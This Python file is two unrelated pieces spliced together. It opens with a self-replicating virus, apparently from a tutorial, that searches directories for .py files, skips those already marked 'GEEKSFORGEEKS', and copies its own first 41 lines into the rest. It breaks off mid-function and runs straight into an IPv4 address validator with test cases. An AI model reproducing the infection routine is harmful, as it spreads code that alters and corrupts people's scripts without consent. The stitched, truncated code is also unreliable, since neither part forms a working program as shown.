#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
def in_range(n):  # check if every split is in range 0-255
    if n >= 0 and n <= 255:
        return True
    return False


def has_leading_zero(n):  # check if eery split has leading zero or not.
    if len(n) > 1:
        if n[0] == "0":
            return True
    return False


def isValid(s):

    s = s.split(".")
    if len(s) != 4:  # if number of splitting element is not 4 it is not a valid ip address
        return 0
    for n in s:

        if has_leading_zero(n):
            return 0
        if len(n) == 0:
            return 0
        try:  # if int(n) is not an integer it raises an error
            n = int(n)

            if not in_range(n):
                return 0
        except:
            return 0
    return 1


if __name__ == "__main__":

    ip1 = "222.111.111.111"
    ip2 = "5555..555"
    ip3 = "0000.0000.0000.0000"
    ip4 = "1.1.1.1"
    print(isValid(ip1))
    print(isValid(ip2))
    print(isValid(ip3))
    print(isValid(ip4))


# this code is contributed by Vivek Maddeshiya.
# Time Complexity: O(n)
# Space Complexity: O(1)
